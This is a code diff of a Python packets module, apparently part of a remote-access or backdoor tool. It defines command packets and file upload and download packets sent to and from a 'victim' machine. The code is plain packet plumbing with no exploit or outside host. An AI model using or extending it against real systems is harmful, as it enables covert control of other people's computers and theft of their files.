@@ -5,8 +5,17 @@
 The packets module.
 ======================
 
-These modules is intented to complement protocol module. The packets are especial classes
+These modules is intented to complement protocol module. The packets are special classes
 to create protocol packets.
+
+The Packet class handle raw packets with a specific protocol code. The default code is the CMD code, but
+any other protocol code can be used. Respose protocol codes should only be used for the victim socket.
+
+The FileUploadPacket uses Packet as base class and handle a file upload to victim using the UPLOAD protocol
+code. The class make the upload much more easy, but there is no problem to use the Packet class to send 
+files through socket, since the correct protocol code is used.
+
+The FileDownloadPacket class also uses Packet as base class to handle a file download from victim pc.
 
 """
 
@@ -15,9 +24,9 @@ import protocol
 from utils import DataInterface
 
 class Packet(DataInterface):
-    def __init__(self, content, params={}, code=None):
+    def __init__(self, content=None, params={}, code=None):
         """
-        Create the packet object.
+        Create the packet object. The default code is the protocol CMD.
 
         :param content: The packet content.
         :param params: The packet optional parameters.
@@ -26,7 +35,7 @@ class Packet(DataInterface):
         """
         self._content = content
         self._params = params
-        self._code = code if code else protocol.MSG
+        self._code = code if code else protocol.CMD
 
     @property
     def content(self):
@@ -83,36 +92,14 @@ class FileUploadPacket(Packet):
         return params
 
 class FileDownloadPacket(Packet):
-    def __init__(self, content, params={}):
+    def __init__(self, filename):
         """
-        Create a file packet to send files through socket.
+        Create a packet to download a file on client.
         The default status code is the DOWNLOAD protocol code.
 
-        :param content: The file content as bytes.
-        :param params: Parameters of the file.
+        :param filename: The file name to download.
         :return: The FileDownloadPacket object.
         """
-        Packet.__init__(self, content=content, params=params, code=protocol.DOWNLOAD)
-
-    def to_file(self, path=None):
-        """
-        Make file from the packet content.
-
-        :param path: The path to file. Use the default parameter on packet.
-        :return: The path of the created file.
-        """
-        # Get the name of the downloaded file from packet parameters.
-        path = path if path else self.params['name']
-
-        if type(self.content) is bytes:
-            # Specifies to mode in which the file will be opened.
-            # Set to write bytes to file when the content is bytes-like object.
-            mode = 'w+b'
-        else:
-            # Normal write mode.
-            mode = 'w'
-
-        with open(path, mode) as handler:
-            # Write content to file.
-            handler.write(self.content)
-        return path
+        # Set the filename of the file to download on packet parameters.
+        params = {'filename': filename}
+        Packet.__init__(self, params=params, code=protocol.DOWNLOAD)
